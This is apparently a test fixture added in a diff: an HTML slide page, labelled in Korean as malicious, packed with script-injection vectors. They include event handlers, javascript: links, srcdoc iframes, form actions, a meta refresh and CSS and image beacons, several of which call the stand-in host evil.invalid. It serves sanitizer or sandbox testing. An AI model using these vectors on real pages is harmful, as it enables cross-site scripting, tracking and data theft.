@@ -1,0 +1,21 @@
+<!doctype html><html><head><title>악성</title>
+<base href="https://evil.invalid/">
+<meta http-equiv="refresh" content="0;url=https://evil.invalid/redirect">
+<link rel="stylesheet" href="https://evil.invalid/x.css">
+<style>body{background:url(https://evil.invalid/css-beacon.png)} @import url("https://evil.invalid/import.css");</style>
+<script>top.__pwned = 'head-script'; parent.__pwned = 'head-script'; fetch('https://evil.invalid/fetch');</script>
+<script src="https://evil.invalid/x.js"></script>
+</head><body onload="top.__pwned='body-onload'">
+<section class="slide"><h1 onclick="top.__pwned='h1-click'">클릭 공격 제목</h1>
+<img src="x" onerror="top.__pwned='img-onerror'">
+<img src="https://evil.invalid/pixel.gif">
+<svg onload="top.__pwned='svg-onload'"><script>top.__pwned='svg-script'</script><a href="javascript:top.__pwned='svg-link'"><text y="20">링크</text></a></svg>
+<a href="javascript:top.__pwned='link'" id="jslink">자바스크립트 링크</a>
+<iframe srcdoc="<script>top.__pwned='srcdoc'</script>"></iframe>
+<iframe src="https://evil.invalid/frame" width="0" height="0"></iframe>
+<object data="https://evil.invalid/x.swf"></object><embed src="https://evil.invalid/y">
+<form action="https://evil.invalid/steal"><input name="q" autofocus onfocus="top.__pwned='autofocus'"><button formaction="javascript:top.__pwned='formaction'">전송</button></form>
+<video src="https://evil.invalid/v.mp4" autoplay onplay="top.__pwned='video'"></video>
+<div style="background:url('https://evil.invalid/inline-beacon.png')">배경 비컨</div>
+</section><section class="slide"><h1>둘째 장</h1></section>
+<script>top.__pwned='body-script'</script></body></html>
